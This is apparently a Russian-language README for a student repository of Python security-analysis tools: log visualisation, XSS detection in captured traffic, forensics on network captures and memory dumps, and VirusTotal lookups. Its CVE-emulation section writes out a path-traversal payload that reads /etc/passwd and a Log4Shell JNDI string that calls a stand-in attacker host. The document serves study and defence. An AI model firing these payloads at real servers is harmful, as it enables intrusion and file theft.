# Инструменты анализа информационной безопасности

Этот проект представляет собой набор утилит на Python для анализа информационной безопасности. Он включает в себя скрипт
для визуализации логов событий ИБ и утилиту для низкоуровневого анализа сетевого трафика, включая поиск потенциальных
XSS-атак, демонстрацию эксплуатации распространенных уязвимостей (CVE) через безопасные эмулирующие Proof of Concept
(PoC) атаки, а также для комплексного анализа смешанных логов для выявления угроз и для цифровой криминалистики
(форензики) анализа дампов памяти и сетевого трафика.

## Описание:

Проект состоит из следующих основных скриптов:

### 1. Анализ логов событий (vizualisation.py):

Этот скрипт предназначен для анализа данных из файла events.json. Он выполняет следующие действия:

- Загружает данные о событиях ИБ из файла events.json.
- Использует библиотеку Pandas для создания DataFrame.
- Группирует события по полю signature и подсчитывает их количество.
- Визуализирует полученные данные с помощью библиотеки Seaborn, сохраняя график в файл event_distribution.png.

### 2. Анализ сетевого трафика (scapy_xss_analyzer.py):

Этот скрипт использует библиотеку Scapy для работы с сетевыми пакетами. Его функционал включает:

- Отправка HTTP-запросов: Позволяет отправлять кастомные HTTP-запросы, минуя стандартные библиотеки, для тестирования
  сетевых сервисов.
- Перехват трафика: Перехватывает TCP-трафик на указанном интерфейсе (например, на порту 80) и сохраняет его в .pcap
  файл.
- Анализ трафика: Анализирует перехваченный или сохраненный трафик, извлекает HTTP-запросы и ответы, а также ищет в них
  признаки XSS-атак (<script>, onerror=, javascript: и т.д.).
- Работа с .pcap: Позволяет анализировать ранее сохраненные файлы трафика.

### 3. Эмуляция для известных критических уязвимостей (exploits_emulation.py):

- CVE-2021-41773 — Path Traversal в Apache HTTP Server 2.4.49
  Описание: Уязвимость позволяет атакующему, отправившему специально сформированный URL, выйти за пределы корневого
  каталога веб-сервера и прочитать произвольные файлы на системе.
  Payload: /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

- CVE-2021-44228 — Log4Shell (Remote Code Execution)
  Описание: Критическая уязвимость в библиотеке логирования Log4j. Она позволяет удаленно выполнять код на сервере через
  JNDI (Java Naming and Directory Interface) инъекцию в строках, которые попадают в лог.
  Payload: ${jndi:ldap://attacker-controlled-ldap.com/a}

### 4. Комплексный анализ логов (negative_events_analysis.py):

Этот скрипт предназначен для глубокого анализа комбинированных логов из файла botsv1.json, который содержит как
DNS-запросы, так и логи безопасности Windows. Он выполняет следующие действия:

- Загружает данные из JSON-файла и автоматически разделяет их на DNS-логи и логи безопасности Windows.
- Выполняет комплексную очистку данных, включая восстановление временных меток из отдельных полей (date_year,
  date_month и т.д.) и обработку списков в ячейках.
- Проводит анализ DNS-трафика на предмет подозрительной активности с использованием регулярных выражений для поиска
  DGA (Domain Generation Algorithms) и ключевых слов для выявления C2 (Command & Control) серверов.
- Анализирует логи безопасности Windows, выявляя частые события (например, 4624, 4688) и предоставляя детальное
  описание их значения для контекста.
- Формирует подробный текстовый отчет в консоли, включая список подозрительных DNS-запросов и итоговый вердикт о
  наличии угроз.
- Создает и сохраняет графики: распределение подозрительных IP-адресов (top_suspicious_ips.png) и топ-10 событий
  Windows (top_windows_events.png).
- Дает рекомендации по дальнейшей автоматизации и улучшению системы мониторинга.

### 5. Форензика сетевых дампов (pcap/pcapng) - forensic_analysis.py:

Этот скрипт предназначен для анализа файлов сетевого трафика (PCAP/PCAPNG) с использованием библиотеки PyShark (обертка
над Wireshark/TShark). Он выполняет:

- Загрузку и анализ сетевого дампа.
- Извлечение всех DNS-запросов с временными метками, IP-адресами источников и назначения.
- Извлечение информации о TCP/UDP соединениях (IP-адреса, порты, протоколы, размер пакетов).
- Сохранение извлеченных данных в CSV-файлы (dns_requests.csv, connections.csv).
- Визуализацию DNS-активности во времени (dns_timeline.png).
- Визуализацию топ-10 самых запрашиваемых доменов (top_domains.png).
- Визуализацию топ-10 самых активных IP-адресов (top_talkers.png).
- Формирование подробного текстового отчета с анализом подозрительной активности (порты, внешние соединения) -
  forensic_report.txt.

### 6. Форензика дампов памяти (Memory Dump Analysis) - memory_analyzer_simple.py:

Этот скрипт предназначен для анализа файлов дампов оперативной памяти (например, OtterCTF.vmem). Он демонстрирует
извлечение ключевых артефактов с использованием предварительно известных данных из учебного примера OtterCTF:

- Извлечение списка активных процессов с их PID и PPID.
- Извлечение сетевых соединений с привязкой к процессам.
- Сохранение данных в CSV-файлы (processes.csv, connections.csv).
- Визуализацию топ-10 процессов (processes.png).
- Визуализацию подозрительных внешних IP-адресов (suspicious_ips.png).
- Визуализацию сетевой активности по процессам (process_network.png).
- Формирование подробного отчета с выявлением подозрительного процесса (LunarMS.exe), C2 серверов и рекомендациями по
  реагированию (memory_report.txt).

### 7. Анализ через VirusTotal API (vt_analyzer.py):

Скрипт для проверки файлов через API VirusTotal. Получает статус сканирования и правила фильтрации трафика.
- 

- Проверяет файл по хэшу (по умолчанию EICAR тестовый файл)
- Выводит полный JSON-ответ от API
- Показывает **статус сканирования** (имя файла, тип, размер, SHA256)
- Отображает **статистику детектов** (вредоносные, подозрительные, безопасные, неопределенные)
- Извлекает **правила фильтрации трафика** от разных антивирусных движков
- Сохраняет результат в JSON-файл

Обязательно предварительно получите API ключ на [VirusTotal](https://www.virustotal.com) и вставьте полученные значения
в соотвествующую переменную (API_KEY_VT) в свой .env, сформированный на основании .env.example в проекте.

## Стек проекта

- Python 3
- Pandas — для обработки и анализа данных.
- Matplotlib & Seaborn — для визуализации.
- Poetry — для управления зависимостями.
- Scapy - для парсинга уязвимостей.
- Numpy — для числовых операций.
- Requests - для проверки эмуляции уязвимостей.
- Asyncio - для работы с асинхронными операциями в PyShark.
- PyShark - для анализа сетевых дампов (обертка над Wireshark).

## Установка:

### Требования:

- Python 3.10 или выше
- Wireshark/TShark (для работы PyShark) - скачайте с [официального сайта](https://www.wireshark.org/download.html)

1. Клонируйте репозиторий:

```
git clone -b develop https://github.com/Rapunzel-Chan/homeworks.git
```

2. Установите зависимости:

```
pip install -r requirements.txt
```

## Использование:

1. Переключитесь на проект:

```
cd homeworks
```

2. Создайте виртуальное окружение:

```
python -m venv venv
```

3. Активируйте виртуальное окружение:

- Windows:

```
.\venv\Scripts\activate
```

- Linux/macOS:

```
source venv/bin/activate
```

4. Создайте .env файл в корне проекта и заполните данные на примере .env.example.

5. Запустите файл main.py:

- Для запуска приветствия

```
python main.py 
```

- Для запуска скрипта для анализа данных о нарушениях безопасности

```
python vizualisation.py
```
